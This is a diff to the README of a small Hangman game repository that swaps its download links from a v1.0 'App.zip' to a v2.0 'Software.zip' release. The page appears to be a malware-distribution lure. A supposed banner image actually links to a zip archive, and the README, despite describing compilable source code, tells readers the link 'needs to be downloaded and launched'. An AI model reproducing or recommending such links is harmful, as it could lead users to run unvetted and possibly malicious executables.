@@ -1,7 +1,7 @@
 
 # Hangman-Game
 
-![Hangman Banner](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v1.0/App.zip)
+![Hangman Banner](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v2.0/Software.zip)
 
 Welcome to the Hangman Game repository! This project implements the classic Hangman game where players try to guess a hidden word by suggesting letters. The game randomly selects words and provides feedback on correct and incorrect guesses. It's a great project for practicing basic game development and exploring string manipulation. The code is well-commented and easy to follow.
 
@@ -18,7 +18,7 @@ To play the Hangman game, simply clone the repository to your local machine and 
 "beginner, c, cli, console-game, education, game, hangman, learning, open-source, programming, software-development, tutorial, word-game"
 
 ## Download Hangman Game:
-[![Download Hangman Game](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v1.0/App.zip)](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v1.0/App.zip)
+[![Download Hangman Game](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v2.0/Software.zip)](https://github.com/AvaLonAkaMichael/Hangman-Game/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be downloaded and launched to access the Hangman game.*
 
